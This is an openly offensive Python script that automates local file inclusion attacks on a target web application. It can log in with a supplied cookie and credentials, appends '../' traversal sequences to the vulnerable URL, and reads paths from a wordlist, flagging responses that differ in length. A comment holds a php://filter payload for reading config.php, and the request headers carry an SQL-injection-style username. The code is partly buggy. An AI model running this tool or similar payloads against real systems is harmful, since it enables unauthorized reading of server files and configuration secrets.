#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
ssl._create_default_https_context = ssl._create_unverified_context     
#php://filter/read=convert.base64-encode/resource=../../config.php
class Local_File_In :
    
        def __init__(self):
            self.control()
            if self.args.auth and self.args.Vulnurl\
            and self.args.password and self.args.user\
            and self.args.Cookie and self.args.loginurl\
            and self.args.filelist:
                self.Login_auth()
                self.url_request()
            elif not self.args.auth and self.args.Vulnurl\
            and not self.args.password and not self.args.user and self.args.Cookie\
            and self.args.filelist :
                self.url_request()
            else:
                print("[+] Error")    
        def Login_auth(self):
            loginurl = self.args.loginurl
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)
            with open(self.args.Cookie,'r') as Cookie_file :
                      Cookie =  Cookie_file.read() 
            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(Cookie).replace('\n','')),]
            url_login = request.open(loginurl) 
            request.select_form(nr = 0)
            if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                   request["username"] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}' 
            elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}'
            elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                   request["username"] = '{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
            elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
            response   = request.submit()         
            self.info = response.info()
          #  self.info_req =  self.info 
            content    = response.read()  
            self.url = response.geturl()      
        def url_request(self):
            LFI=''
            LFI += self.args.Vulnurl
            LFI += "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
            ssl._create_default_https_context = ssl._create_unverified_context                
            with  open('LFI-wordlist.txt','r') as list_command  :  
                  list_command  = list_command .readlines()                                
            for command in list_command : 
               if self.args.auth:
                  self.Login_auth() 
               command  = str(command).replace('/','%2F')         
               url = LFI+command
               request = mechanize.Browser()
               request.set_handle_robots(False)
               request.set_handle_redirect(True)
               request.set_handle_refresh(True, max_time=1)
               if self.args.Cookie:
                  with open(self.args.Cookie,'r') as Cookie_file :
                      Cookie =  Cookie_file.read() 
                      request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                             Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                            ('Cookie',str(Cookie).replace('\n','')),
                                            ('username',"admin'#"),
                                            ('password','password')]
               else:
                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                           Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]  
               first_req = request.open(self.args.Vulnurl).read()                                                      
               Get_Oregnal_URL = request.open(url).read()                
               #if self.args.auth and  len(Get_Oregnal_URL) !=   self.info[26] :
               if self.args.auth and len(Get_Oregnal_URL) != len(first_req) :                  
                  pythex = str(re.findall('Content-Length:.+',str(self.info)))
                  pythex= pythex.replace("['",'').replace("']",'')
                  if pythex in str(self.info):
                    info = str(self.info).replace(pythex,'Content-Length:'+str(len(Get_Oregnal_URL)))
                    print(info)
                  print(url)
                  exit() 
               elif not self.args.auth and len(Get_Oregnal_URL) != len(first_req) :
                     print(url)  
                     exit()
        def control(self): 
           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
           parser.add_argument("-UV ","--Vulnurl"              , action=None ,required=True      ,help ="url Targst web") 
           parser.add_argument("--auth", action='store_true'                                     ,help ="url Targst web") 
           parser.add_argument("-F","--filelist"             , action=None     ,required=True    ,help ="read fron lfi wordlsit ")
           parser.add_argument("-C","--Cookie"               , action=None                       ,help ="Login sesion Cookie")  
           parser.add_argument("-UF ","--UserForm"           , action=None                       ,help =" add name of the HTML Form Login User")
           parser.add_argument("-PF ","--PassForm"           , action=None                       ,help ="add name of the HTML Form Login Passord")
           parser.add_argument("-P  ","--password"           , action=None                       ,help ="use specific Passowrd")   
           parser.add_argument("-LU  ","--loginurl"          , action=None                       ,help ="use specific Passowrd") 
           parser.add_argument("-U  ","--user"               , action=None                        ,help ="use specific username ")
           self.args = parser.parse_args()     
           if len(sys.argv)!=1 :
              pass
           else:
              parser.print_help()         
              exit()                   
if __name__=='__main__':
     Local_File_In()                  
                 
                 
                 
                 
                 
                 
                 
                 
